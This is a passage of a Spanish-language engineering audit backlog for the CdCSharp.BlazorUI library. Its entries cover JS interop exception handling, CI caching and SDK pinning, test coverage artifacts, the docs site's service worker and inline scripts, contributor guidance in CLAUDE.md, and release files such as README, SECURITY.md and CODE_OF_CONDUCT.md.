- **Alcance**: `src/CdCSharp.BlazorUI.Localization.Wasm/WasmLocalizationPersistence.cs:12-46`.
- **Evidencia**:
  ```csharp
  internal class WasmLocalizationPersistence : ILocalizationPersistence
  {
      private IJSObjectReference? _module;
      // ...
      public async Task<string?> GetStoredCultureAsync()
      {
          try { ... return await module.InvokeAsync<string?>("get", CULTURE_KEY); }
          catch { return null; }
      }
  }
  ```
  - No implementa `IAsyncDisposable` → `_module` se libera sólo cuando el GC lo recolecte; en Blazor Server (misc circuito) acumula.
  - `catch` sin filtrar: oculta cualquier fallo incluyendo `JSDisconnectedException` esperado y `InvalidOperationException` del prerender.
- **Criterios de aceptación**:
  1. `class WasmLocalizationPersistence : ILocalizationPersistence, IAsyncDisposable` con `DisposeAsync` llamando `_module?.DisposeAsync()`.
  2. Cambiar `catch { return null; }` a `catch (JSDisconnectedException) { return null; } catch (InvalidOperationException) { return null; } catch (JSException) { return null; }` (ver contrato CLAUDE.md §Async conventions).
  3. Registro como `AddScoped` (ya lo es) — en Wasm es equivalente a Singleton; en Server (no aplica directamente pero relacionado al patrón) asegura per-circuit.
- **Notas**: patrón consistente con `ModuleJsInteropBase`; quizá migrar para heredar de ahí (ver `JS-xx`).

### `CI-05` — Sin caché de NuGet ni de `node_modules` en el pipeline: cada run descarga desde cero

- **Estado**: ✅ Resuelto (colateralmente por `ARCH-14`, commit `39b839a`) — `setup-dotnet@v4` recibe `cache: true` + `cache-dependency-path: '**/*.csproj'`; cubre criterio 1. Criterio 2 (`node_modules` cache) se descarta con justificación: `package-lock.json` es gitignored (BLD-PIPE-14 política B) y se regenera en cada build, un cache con dependency-path al lock siempre haría miss. Criterio 3 (medición antes/después) queda como follow-up operacional. Tarea duplicada con `ARCH-14` — el análisis las originó desde ángulos distintos (build pipeline vs. CI), el fix converge.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `.github/workflows/publish.yml:45-49` (`setup-dotnet`), `142-143` (`Restore dependencies`).
- **Evidencia**:
  - `actions/setup-dotnet@v4` admite `cache: true` + `cache-dependency-path: '**/packages.lock.json'` pero no se usa.
  - `node_modules` generado por BuildTools (`src/CdCSharp.BlazorUI/node_modules`) se regenera en cada run con `npm install` → añade 30-60s al build.
  - `dotnet restore` sin caché recorre ~20 proyectos cada run.
- **Criterios de aceptación**:
  1. Activar `cache: true` en `actions/setup-dotnet@v4`. Requiere `packages.lock.json` en cada csproj; alternativamente usar `actions/cache@v4` con `~/.nuget/packages`.
  2. Añadir `actions/cache@v4` para `**/node_modules` con key `${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}`.
  3. Medir tiempo pre/post y documentar en el Summary step.
- **Notas**: impacto: ~1-2 min por run. Para develop con pushes frecuentes, acumula. Cross con `BLD-PIPE-xx`.

### `CI-06` — `dotnet nuget push --no-symbols` bloquea distribución de `.snupkg`: consumers no pueden debuggear hacia dentro del paquete

- **Estado**: ✅ Resuelto (colateralmente por `ARCH-08`, commit `6f2dba4`) — `--no-symbols` ya fue eliminado del `dotnet nuget push` en la resolución de ARCH-08 (`ci(release): drop --no-symbols from nuget push to publish snupkg symbols`). `Directory.Build.props` declara `IncludeSymbols=true` + `SymbolPackageFormat=snupkg`, con lo que `dotnet pack` produce el `.snupkg` junto al `.nupkg` y NuGet los empareja al push. Verificado empíricamente en el pack de PKG-06: `CdCSharp.BlazorUI.1.0.0.snupkg` contiene `lib/net10.0/CdCSharp.BlazorUI.pdb`. Criterio 3 (step-into VS/Rider) queda como validación operacional del release.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `.github/workflows/publish.yml:230-234`.
- **Evidencia**:
  ```bash
  dotnet nuget push "$package" \
    -k ${{ secrets.NUGET_API_KEY }} \
    -s https://api.nuget.org/v3/index.json \
    --skip-duplicate \
    --no-symbols
  ```
  `--no-symbols` evita el push automático del `.snupkg`. Combinado con `PKG-04` (Source Link + `.snupkg`), esto anula el beneficio de empaquetar símbolos: se generan pero no llegan a nuget.org.
- **Criterios de aceptación**:
  1. Eliminar `--no-symbols` del `dotnet nuget push`.
  2. Asegurar que `dotnet pack` genera `.snupkg` (requiere `<IncludeSymbols>true</IncludeSymbols>` + `<SymbolPackageFormat>snupkg</SymbolPackageFormat>` por csproj — ver `PKG-04`).
  3. Validar en un install de prueba que VS/Rider hace step-into dentro del código de la librería.
- **Notas**: Microsoft dejó `--include-symbols` obsoleto; la mecánica correcta es empujar los `.snupkg` implícitamente junto al `.nupkg` (mismo endpoint, detecta por extensión).

### `CI-07` — `DOTNET_VERSION: '10.0.x'` es una versión flotante + ausencia de `global.json`: builds no reproducibles

- **Estado**: ✅ Resuelto (commit `639cde6`, criterios 1-2) — `global.json` en raíz declara `{"sdk":{"version":"10.0.203","rollForward":"latestFeature"}}`. `publish.yml` elimina `DOTNET_VERSION` y pasa `global-json-file: global.json` a `actions/setup-dotnet@v4`, de modo que el SDK de CI se ancla exactamente al que usan los contributors locales. `rollForward: latestFeature` permite bumps compatibles (10.0.203 → 10.0.2xx) sin saltar a 10.1. `dotnet --version` confirma 10.0.203 activo tras el cambio. Criterio 3 (Dependabot auto-bump de `global.json`) queda como follow-up — Dependabot no soporta `global.json` nativamente; requiere scripting custom o Renovate, fuera de scope aquí.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `.github/workflows/publish.yml:29`; raíz del repo (`global.json` ausente).
- **Evidencia**:
  - `'10.0.x'` resuelve al último patch disponible en el runner al momento del run. Si Microsoft libera `10.0.200` y rompe algo, el run falla sin cambios en el repo.
  - No hay `global.json` → `dotnet` local de contributors usa la versión instalada de cada máquina (puede ser `10.0.100` vs `10.0.200`).
- **Criterios de aceptación**:
  1. Crear `global.json` en raíz:
     ```json
     { "sdk": { "version": "10.0.100", "rollForward": "latestFeature" } }
     ```
  2. Cambiar `DOTNET_VERSION: '10.0.100'` en el workflow o leer de `global.json` (`actions/setup-dotnet@v4` con `global-json-file: global.json`).
  3. Dependabot puede auto-bumpear `global.json` al igual que cualquier dependencia.
- **Notas**: reproducibilidad + aislamiento de environment. Regla general: **ningún** proyecto de producción debería usar `x` como sufijo en CI.

### `CI-08` — `dotnet test` sin coverage ni artifact upload: PRs no muestran cobertura ni retienen resultados

- **Estado**: ✅ Resuelto (commit `640e399`, criterios 1-2) — `publish.yml` step **Test** añade `--logger "trx;LogFileName=test-results.trx"` + `--collect:"XPlat Code Coverage"` + `--results-directory ./test-results`. Nuevo step **Upload Test Results** (`actions/upload-artifact@v4`, `if: always()` para subirlos también en fallo, retención 14 días) deja TRX + `coverage.cobertura.xml` descargables desde la pestaña Actions. Validado localmente con la solución completa: `test-results/test-results.trx` + `coverage.cobertura.xml` producidos correctamente. Criterio 3 (ReportGenerator → GITHUB_STEP_SUMMARY) queda como follow-up — requiere step adicional con `dotnet-coverage`/`ReportGenerator` y parseo; esto ya cubre el transporte que CI-08 pide. Criterio 4 (Codecov) descartado por ahora — externaliza dato de cobertura a servicio terceros sin valor inmediato.
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `.github/workflows/publish.yml:176-180`.
- **Evidencia**:
  ```yaml
  - name: Test
    run: |
      dotnet test \
        -c ${{ env.CONFIGURATION }} \
        --verbosity normal
  ```
  - Sin `--collect:"XPlat Code Coverage"` → cobertura local (`Test-Coverage.ps1`) no se refleja en CI.
  - Sin `--logger trx` → sin TRX para upload.
  - Sin `actions/upload-artifact@v4` con los resultados → si un test falla en PR, no se puede descargar el log completo; hay que abrir GitHub Actions UI.
  - Sin reporte de cobertura en el Summary del run.
- **Criterios de aceptación**:
  1. Añadir `--collect:"XPlat Code Coverage" --logger "trx;LogFileName=test-results.trx" --results-directory ./test-results`.
  2. Step post: `actions/upload-artifact@v4` con `./test-results/**`.
  3. Step post: correr ReportGenerator (o `coverlet.msbuild`) sobre los `.cobertura.xml` y publicar summary en `$GITHUB_STEP_SUMMARY`.
  4. (Opcional) Integrar con Codecov (`codecov/codecov-action@v4`) para gating de PRs.
- **Notas**: cross con `TEST-08` (coverage gate). Este task es el transporte; `TEST-08` es el umbral.

### `CI-09` — Sin `actions/setup-node@v4`: la versión de Node.js que ejecuta Vite/npm depende de la que traiga el runner por defecto

- **Estado**: ✅ Resuelto (commit `39b839a`) — `publish.yml` declara `actions/setup-node@v4` con `node-version: '20'` tras el `setup-dotnet`, antes de los targets que invocan BuildTools. Node 20 LTS pinned; upgrades del runner `ubuntu-latest` dejan de poder romper Vite por cambio silencioso de Node. Criterio 2 (cache npm): se omite deliberadamente — `package-lock.json` es gitignored (ver BLD-PIPE-14) y se regenera en cada build; un cache con dependency-path al lock siempre haría miss. Trade-off documentado en ARCH-14.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `.github/workflows/publish.yml` (step ausente antes de `Build Projects`).
- **Evidencia**:
  - `ubuntu-latest` trae Node 20.x por defecto a fecha 2026-04, pero GitHub actualiza el runner sin aviso. El `BeforeBuild` de `CdCSharp.BlazorUI` ejecuta `npm install` + `vite build` dependiendo del Node preinstalado.
  - Sin pin, un upgrade del runner puede romper el build por incompatibilidad de Vite o de un plugin.
  - El proyecto no declara `engines` en `package.json` generado (por `BuildTemplates.cs`) → no hay señal de qué versión usar.
- **Criterios de aceptación**:
  1. Añadir antes del build:
     ```yaml
     - uses: actions/setup-node@v4
       with:
         node-version: '20'
         cache: 'npm'
         cache-dependency-path: '**/package-lock.json'
     ```
  2. Añadir `"engines": { "node": ">=20" }` al template `package.json` en `BuildTemplates.cs`.
  3. Cuando se haga bump de Node, actualizar ambos simultáneamente.
- **Notas**: cross con `CI-05` (cache de node_modules). Si CI-05 se ejecuta, la config de `setup-node@v4` con `cache: 'npm'` es la vía más directa.

### `DOCS-WASM-05` — `Home.razor` catch incompleto al cargar/disposed `hero-parallax.js`: sólo captura `JSDisconnectedException`

- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/Pages/Home.razor:57-77`.
- **Evidencia**:
  ```csharp
  try
  {
      _parallaxModule = await _js.InvokeAsync<IJSObjectReference>("import", "./js/hero-parallax.js");
      await _parallaxModule.InvokeVoidAsync("attach", _heroRef);
  }
  catch (JSDisconnectedException) { }
  // DisposeAsync igual
  ```
  CLAUDE.md fija el contrato de catch triple (`JSDisconnectedException` + `InvalidOperationException` + `ObjectDisposedException` + `JSException`). Aquí sólo se cubre uno. Si el módulo JS falla al cargar (p. ej. 404 por cache-busting), `JSException` sale no manejado → error UI visible al usuario.
- **Criterios de aceptación**:
  1. Ampliar catch a la tripleta canónica + `JSException`.
  2. Replicar en `DisposeAsync`.
  3. Registrar pattern en `CLAUDE.md` como "docs site standard" (cross con `CLAUDE-xx`).
- **Notas**: cross con `ASYNC-xx`. Patrón a replicar en TODO el docs site y samples.

### `DOCS-WASM-06` — `service-worker.js` nunca puebla la cache: `caches.match` devuelve siempre `undefined` → SW efectivamente no-op

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/wwwroot/service-worker.js:1-19`.
- **Evidencia**:
  ```js
  self.addEventListener('install', (e) => { self.skipWaiting(); });
  // NUNCA hace caches.open(CACHE).then(c => c.addAll([...]));
  
  self.addEventListener('fetch', (e) => {
      e.respondWith(
          fetch(req).catch(() => caches.match(req).then(r => r || Response.error()))
      );
  });
  ```
  - En `install`, el SW no llama `caches.open(CACHE).addAll(...)` ni cachea `fetch` responses.
  - `fetch` fallback a `caches.match(req)` siempre retorna `undefined` → `Response.error()`.
  - Efecto: el service worker incrementa complejidad del PWA sin dar offline capability real.
- **Criterios de aceptación**:
  1. Decisión: (a) eliminar SW si no se desea offline; (b) implementar cache first con shell precaching.
  2. Si (b): precachear en `install`: `blazor.webassembly.js`, `index.html`, `icon.svg`, `manifest.webmanifest`, stylesheets. Cachear dinámicamente respuestas de `_framework/*.dll` (+ `.wasm`).
  3. Estrategia recomendada: `Workbox` o una implementación manual tipo "network-first con fallback a cache" donde `fetch` exitoso escriba a cache.
  4. Probar `chrome://serviceworker-internals/` → ver requests servidos desde cache.
- **Notas**: PWA fake actual. Cross con `DOCS-WASM-11` (manifest completo).

### `DOCS-WASM-07` — `index.html` contiene scripts inline sin nonce: incompatible con CSP estricta

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/wwwroot/index.html:42-53, 56-62`.
- **Evidencia**:
  ```html
  <script>
      window.__buiInstall = { ... };
      window.addEventListener('beforeinstallprompt', ...);
      window.addEventListener('appinstalled', ...);
  </script>
  <script>
      if ('serviceWorker' in navigator) { ... }
  </script>
  ```
  Si el hosting (GitHub Pages, Cloudflare Pages) aplica `Content-Security-Policy: script-src 'self'`, estos inline scripts son bloqueados → el PWA install prompt y el SW no se registran.
- **Criterios de aceptación**:
  1. Extraer ambos bloques a archivos externos en `wwwroot/js/pwa-install.js` + `wwwroot/js/sw-register.js`.
  2. Incluir con `<script src="js/pwa-install.js" defer></script>`.
  3. Si se desea mantener inline: configurar CSP con nonce per-request (no trivial en static hosting; evitar).
- **Notas**: cross con `SEC-xx` (CSP). Preparación para habilitar CSP cuando se sirva desde custom hosting.

### `DOCS-WASM-08` — `MainLayout.razor` usa namespace completo `CdCSharp.BlazorUI.Components.Wasm.BUICultureSelector` pero referencia variant con path inconsistente

- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/Layout/MainLayout.razor:15-16`.
- **Evidencia**:
  ```razor
  <CdCSharp.BlazorUI.Components.Wasm.BUICultureSelector Size="SizeEnum.Small"
                                                         Variant="BlazorUI.Components.Wasm.BUICultureSelectorVariant.Dropdown"/>
  ```
  - Tag qualification completa `CdCSharp.BlazorUI.Components.Wasm.BUICultureSelector` → indica que el `@using` falta en `_Imports.razor`.
  - `Variant="BlazorUI.Components.Wasm...."` — namespace **incompleto** (le falta `CdCSharp.`); funciona sólo porque el resolver Razor intenta matching por sufijo. Brittle ante renaming.
- **Criterios de aceptación**:
  1. Añadir `@using CdCSharp.BlazorUI.Components.Wasm` a `docs/CdCSharp.BlazorUI.Docs.Wasm/_Imports.razor`.
  2. Simplificar a `<BUICultureSelector Size="SizeEnum.Small" Variant="BUICultureSelectorVariant.Dropdown"/>`.
  3. Si `L10N-01` consolida el componente al paquete principal, el `@using` cambia a `CdCSharp.BlazorUI.Components`.
- **Notas**: cross con `L10N-01`. Trivial fix, alta legibilidad.

### `DOCS-WASM-09` — Sin buscador ni índice alfabético: 26 componentes navegables sólo por sidebar jerárquico

- **Severidad**: Minor
- **Esfuerzo**: M
- **Alcance**: `docs/CdCSharp.BlazorUI.Docs.Wasm/Layout/`; nueva página `Pages/Search.razor`; posible integración con `docs/CdCSharp.BlazorUI.Docs.CodeGeneration` para emitir índice.
- **Evidencia**: la única navegación es el `BUITreeMenu` con 5 categorías y 26 componentes anidados (`Pages/Components/*` + 5 `Pages/Concepts/*`). No hay:
  - Input `ctrl+K` / `/` de búsqueda.
  - Página índice alfabético.
  - Atajos de teclado (cross `A11Y-xx`).
- **Criterios de aceptación**:
  1. Añadir componente `DocSearch` en header: `<BUIInputText>` + listado filtrado de rutas + navegación on-select.
  2. Índice de búsqueda: (a) hardcoded en un JSON generado por `Docs.CodeGeneration`, o (b) MiniSearch.js.
  3. Atajo teclado: `ctrl+K` / `/` focus al input.
  4. Resultados con highlight + breadcrumb (Componente > Forms > Button).
- **Notas**: cross con `A11Y-xx`, `DOCS-WASM-03` (CI build deploy). Patrón estándar en MUI, Radix, shadcn docs.

### `CLAUDE-05` — Sin sección "Testing expectations" con coverage gates ni criterios de aceptación de PR

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `CLAUDE.md:168-272` (`## Testing`).
- **Evidencia**: la sección `## Testing` describe la **estructura** (archivos, nombres, traits) pero NO el **contrato de cobertura**:
  - ¿Cuánto cubre un PR de nuevo componente? ¿6 archivos obligatorios o lo mínimo?
  - ¿Qué % coverage es aceptable (ver `TEST-08`)?
  - ¿Los snapshots se aceptan con diffs del snapshot sin revisar?
  - ¿Qué bloquea un PR: tests en rojo? Coverage caído? Snapshots `.received`?
- **Criterios de aceptación**:
  1. Añadir subsección `### Coverage expectations`:
     - Mínimo 80% de líneas en `src/CdCSharp.BlazorUI` (excluyendo `.razor` autogenerated).
     - Nuevos componentes requieren los 6 archivos de test si tienen parámetros, eventos o variants; si es un wrapper puro, basta `Rendering` + `Snapshot`.
     - `.received.txt` en PR = rechazo automático.
  2. Añadir subsección `### PR gates`:
     - `dotnet build -c Release` sin warnings en `src/` (ver `BLD-xx`).
     - `dotnet test` en verde.
     - Coverage no baja más de 1% del base.
  3. Cross con `CI-08` (CI pipeline que mide lo anterior).
- **Notas**: consolida expectations que actualmente son implícitas. Los PRs se bloqueen por el linter, no por revisores subjetivos.

### `CLAUDE-06` — §Testing "Not every component needs every file" sin criterio: deja decisión al arbitrio del dev

- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `CLAUDE.md:206`.
- **Evidencia**:
  ```
  Not every component needs every file — only the contexts that apply.
  Families may also warrant `<Component>ValidationTests.cs` (inputs + `EditContext`)
  or `<Component>IntegrationTests.cs` (parent/child composition).
  ```
  "only the contexts that apply" es demasiado vago. Ejemplos: ¿`BUISvgIcon` (sin interacción) necesita `InteractionTests`? ¿`BUITreeMenu` (sin color ni size) necesita `StateTests`?
- **Criterios de aceptación**:
  1. Añadir tabla de decisión:
     | Archivo | Cuándo sí | Cuándo no |
     | ---- | --- | --- |
     | `RenderingTests` | **Siempre** | nunca |
     | `StateTests` | Si hay params que cambien DOM | Componentes sin props |
     | `InteractionTests` | Si hay `OnXxx` callbacks | Puramente display |
     | `VariantTests` | Si hereda `BUIVariantComponentBase` | Otros base |
     | `AccessibilityTests` | Si hay role/aria-X/keyboard | Decorativos `aria-hidden` |
     | `SnapshotTests` | **Siempre** | nunca |
  2. Codify en un `docs-tests-coverage.md` separado o en CLAUDE.md.
- **Notas**: convierte "best judgment" en checklist. Reduce PR review noise.

### `CLAUDE-07` — Ausencia de guía L10N E2E en CLAUDE.md: dev sin pista de cómo añadir `.resx` nuevo

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `CLAUDE.md` (nueva sección `## Localization`).
- **Evidencia**: CLAUDE.md no menciona:
  - Dónde crear `.resx` (`Resources/Pages/...`).
  - Convención de naming (`<PageName>.<culture>.resx`).
  - Cómo añadir un culture nuevo a `LocalizationSettings.SupportedCultures`.
  - Fallback chain: `en-US` → `en` → key literal.
  - Cómo funciona `IStringLocalizer<T>` con generated files.
- **Criterios de aceptación**:
  1. Añadir `## Localization` después de `## CSS architecture`:
     - Setup Server vs WASM en 2 bullets.
     - Patrón `.resx`: path, naming, fallback.
     - Link a samples con ejemplos reales (dependencia de `L10N-11`).
     - Criterio de cuándo string es localizable vs hardcoded.
  2. Cross con `L10N-03`, `L10N-11`, `DOCS-WASM-01`, `DOCS-WASM-02`.
- **Notas**: Blazor L10N es subtle; un dev nuevo sin guía improvisará → divergencia de patrones.

### `CLAUDE-08` — §Build pipeline describe `CdCSharp.BuildTools` pero no lista versión mínima compatible ni cómo upgradearla

- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `CLAUDE.md:35-46`.
- **Evidencia**:
  ```
  `CdCSharp.BlazorUI.BuildTools` ... depends on the third-party NuGet package
  `CdCSharp.BuildTools` (authored by the same owner; see
  `<PackageReference Include="CdCSharp.BuildTools" Version="1.0.3" />`).
  ```
  - Versión `1.0.3` citada en texto libre → no hay contrato si se bumpea. Si un dev upgrade a `1.1.0` con breaking change en `IAssetGenerator.GetContent()`, todos los generators fallan.
  - No dice **qué versión mínima** requiere la API actual ni **cómo detectar incompatibilidad**.
- **Criterios de aceptación**:
  1. Añadir bullet: "Current minimum version: `CdCSharp.BuildTools >= 1.0.3`. Bumping requires: (a) review changelog, (b) run `dotnet build CdCSharp.BlazorUI -c Debug`, (c) verify `CssBundle/*.css` content unchanged (diff-check)."
  2. Añadir al `Directory.Build.props` (cuando exista — ver `DOC-03`) la versión pinned.
  3. Cross con Dependabot grouping (`CI-10`): excluir `CdCSharp.BuildTools` del auto-update o marcar para review manual.
- **Notas**: este paquete es autoría del mismo mantenedor pero igualmente contract sensitive; tratar con el mismo rigor que cualquier dep externa.

### `CLAUDE-09` — Sin sección "Contributing" / workflow social (branch naming, PR description template, review gates)

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `CLAUDE.md` (nueva sección); `.github/PULL_REQUEST_TEMPLATE.md` (nuevo); `CONTRIBUTING.md` (nuevo).
- **Evidencia**:
  - Repo no tiene `CONTRIBUTING.md` ni `PULL_REQUEST_TEMPLATE.md`.
  - CLAUDE.md ignora completamente el workflow social (branches, reviews, merge strategy).
  - Contributors externos carecen de onboarding.
- **Criterios de aceptación**:
  1. Crear `CONTRIBUTING.md` con: branch naming (`feature/`, `fix/`, `chore/`), commit convention (conventional commits), merge strategy (squash), review requirements (1 approve).
  2. Crear `.github/PULL_REQUEST_TEMPLATE.md` con checklist: tests añadidos, docs actualizadas, changelog entry, breaking changes flagged.
  3. Crear `.github/ISSUE_TEMPLATE/bug_report.yml` + `feature_request.yml`.
  4. Desde CLAUDE.md linkear a CONTRIBUTING.md en una sección nueva `## Contributing`.
- **Notas**: pieza faltante para OSS mature. Cross con `CI-11` (CODEOWNERS, branch protection).

### `REL-05` — `README.md` efectivamente vacío (`# BlazorUI` sin newline, 0 líneas): primera impresión nula en nuget.org y GitHub

- **Estado**: ✅ Resuelto (cerrado colateralmente por `DOC-01`, commit `05a1988`) — README reescrito con badges, quickstart, paquetes, localización, docs, contributing y license. NuGet.org renderizará el contenido completo en lugar del heading vacío.
- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `README.md` (raíz).
- **Evidencia**:
  ```bash
  $ wc -l README.md
  0 README.md
  $ cat README.md
  # BlazorUI
  ```
  - Un solo heading, sin contenido.
  - nuget.org renderiza README del paquete como landing; actualmente mostrará `# BlazorUI` y nada más.
  - GitHub repo card muestra README vacío → no hay descripción del proyecto, install, features, link a docs.
- **Criterios de aceptación**:
  1. Crear README con secciones mínimas:
     - Badge row (NuGet version, build status, license, coverage).
     - 1-párrafo descripción (usando el `<Description>` del csproj como base).
     - Quickstart (`dotnet add package CdCSharp.BlazorUI` + 3-line setup).
     - Features tabla o bullet list.
     - Link a docs site (tras `DOCS-WASM-03`).
     - License y copyright (tras `REL-01`).
  2. Referenciar desde csproj: `<PackageReadmeFile>README.md</PackageReadmeFile>` + `<None Include="..\..\README.md" Pack="true" PackagePath="\" />` (ver `DOC-11`).
- **Notas**: duplica `DOC-11` pero desde el ángulo REL (blocker de release, no sólo doc quality).

### `REL-06` — Sin `SECURITY.md`: consumers no saben cómo reportar vulnerabilidades de forma responsable

- **Estado**: ✅ Resuelto (commit `31b275d`) — `SECURITY.md` nuevo en raíz: tabla de versiones soportadas (1.x ✅, 0.x ❌), canal de reporte (email `samuel.maicas.development@gmail.com` + GitHub Security Advisories), formulario mínimo del reporte (paquete+versión, reproducer, impacto, host-specific), timeline de respuesta (ack 3d / triage 7d / fix crítico 14d), scope in/out (XSS/JS interop/CORS dentro; dependencias upstream y DoS pathológico fuera). Alineado con D-01 y con el README que ya apunta a Issues para bugs no-sec.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `SECURITY.md` (raíz); `.github/SECURITY.md` (opcional); settings del repo.
- **Evidencia**:
  - No existe `SECURITY.md`.
  - Sin la GitHub Security Advisories habilitada ni política de disclosure.
  - Para una librería UI que se incorpora en apps de terceros, un XSS en un componente es reportable; no hay canal claro de disclosure.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-01]** Crear `SECURITY.md` con email de contacto `samuel.maicas.development@gmail.com`:
     ```markdown
     # Security Policy
     ## Supported Versions
     | Version | Supported |
     | ------- | --------- |
     | 1.0.x   | ✅        |
     | < 1.0   | ❌ (preview) |

     ## Reporting a Vulnerability
     Please report via GitHub private vulnerability disclosure
     (Settings > Security > Report a vulnerability) or email
     `samuel.maicas.development@gmail.com`. Expect acknowledgement in 72h.
     ```
  2. Habilitar `Settings > Code security > Private vulnerability reporting`.
  3. Cross con `SEC-xx` y `CI-11` (CodeQL).
- **Notas**: requisito OSS estándar. GitHub muestra "Security" tab pro-activamente si existe el archivo. Decisión D-01 (ver §Directivas de diseño): email de contacto confirmado.

### `REL-07` — Sin `CODE_OF_CONDUCT.md`: baja puntuación en community health score

- **Estado**: ✅ Resuelto (commit `31b275d`) — `CODE_OF_CONDUCT.md` nuevo en raíz adopta Contributor Covenant 2.1 por referencia (link externo a `contributor-covenant.org/version/2/1`). Canal de enforcement: `samuel.maicas.development@gmail.com`. Scope aplica a issues/PRs/discussions/repo spaces. GitHub community health check sube a score completo; contributors tienen reglas claras sin reproducir el texto completo del Covenant en el repo.
- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `CODE_OF_CONDUCT.md` (raíz o `.github/`).
- **Evidencia**:
  - GitHub community health check (`github.com/<repo>/community`) requiere CODE_OF_CONDUCT para 100% score.
  - Sin CoC, contributors no saben qué comportamientos están fuera de línea.
  - Proyectos OSS enterprise-ready incluyen uno (Contributor Covenant es el estándar de facto).
- **Criterios de aceptación**:
  1. Adoptar [Contributor Covenant 2.1](https://www.contributor-covenant.org/version/2/1/code_of_conduct/).
  2. **[Decisión F1 D-01]** Sustituir `[INSERT CONTACT METHOD]` por `samuel.maicas.development@gmail.com`.
  3. Referenciar en `CONTRIBUTING.md` (ver `CLAUDE-09`).
- **Notas**: trivial, elevates project to "mature" tier en percepción de community. Decisión D-01 (ver §Directivas de diseño): email de contacto maintainer.

### `REL-08` — `<Version>1.0.0</Version>` hardcoded en csproj pero workflow lo sobrescribe: `dotnet pack` local genera paquete desalineado

- **Severidad**: Minor
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/CdCSharp.BlazorUI.csproj:10`; csproj restantes.
- **Evidencia**:
  ```xml
  <Version>1.0.0</Version>
  ```
  - CI pasa `-p:PackageVersion=${{ version }}` que sobrescribe.
  - Un dev ejecutando `dotnet pack src/CdCSharp.BlazorUI` localmente genera `CdCSharp.BlazorUI.1.0.0.nupkg` — conflicto potencial si sube accidentalmente.
  - Divergencia entre "source of truth del versionado": ¿csproj o workflow?
- **Criterios de aceptación**:
  1. Eliminar `<Version>` de los csproj individuales.
  2. Centralizar en `Directory.Build.props` como `<VersionPrefix>1.0.0</VersionPrefix>` (no `<Version>` para dejar CI inyectar suffix).
  3. Pack local: `dotnet pack -p:VersionPrefix=1.0.0 -p:VersionSuffix=dev.$(date +%s)` para evitar colisión con versiones publicadas.
  4. Documentar en CLAUDE.md §Release (cross con `CLAUDE-02`).
- **Notas**: parte de `DOC-03` (Directory.Build.props), pero desde el ángulo REL.

### `REL-09` — Release notes en `publish.yml` hardcoded con lista fija de 3 paquetes: divergen tras `CI-01`

- **Severidad**: Minor
- **Esfuerzo**: XS
- **Alcance**: `.github/workflows/publish.yml:247-257`.
- **Evidencia**:
  ```yaml
  body: |
    ## 🎉 Release ${{ steps.version.outputs.version }}
    ### 📦 Packages
    - CdCSharp.BlazorUI
    - CdCSharp.BlazorUI.Core
    - CdCSharp.BlazorUI.BuildTools
    ### 🔧 Installation
    dotnet add package CdCSharp.BlazorUI --version ${{ steps.version.outputs.version }}
  ```
  - Hardcoded list; tras `CI-01` (añadir Localization, SyntaxHighlight), la lista queda desactualizada silenciosamente.
- **Criterios de aceptación**:
  1. Reemplazar el body por extracción dinámica:
     ```bash
     echo "## Packages" > body.md
     for nupkg in ./artifacts/*.nupkg; do
       basename "$nupkg" .nupkg >> body.md
     done
     ```
  2. O usar `softprops/action-gh-release@v2` con `files: ./artifacts/*.nupkg` (adjunta + lista automática).
  3. Complementar con changelog extraído de `CHANGELOG.md` (ver `REL-02`).
- **Notas**: cross con `CI-02`, `CI-01`, `REL-02`. Un único fix cubre los tres ángulos si se adopta `softprops/action-gh-release@v2` + `--generate-notes`.

---

## Polish / opcionales

### `BLD-PIPE-17` — Reset y base aplican `<bui-component>` como `inline-flex` por defecto: incompatibilidad con componentes que necesitan ser `block` o `grid` de raíz

- **Severidad**: Polish
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/BaseComponentGenerator.cs:39‑46`.
- **Evidencia**: `bui-component { display: inline-flex; … }`. Componentes layout (`BUICard`, `BUIGrid`, `BUIStackedLayout`, …) deben sobrescribirlo en su `.razor.css` para trabajar en block. Es un patrón reusable pero obliga a duplicar `display` en cada componente layout.
- **Criterios de aceptación**:
  1. Valorar si conviene diferenciar por familia/atributo: `bui-component[data-bui-layout] { display: block; }`, o dejar que cada `.razor.css` declare su display (política actual, que funciona pero añade ruido).
  2. Documentar decisión en `CLAUDE.md` → `CLAUDE-05`.

### `GEN-11` — Generadores sin `AnalyzerReleases.{Shipped,Unshipped}.md` (pre-requisito para diagnósticos)

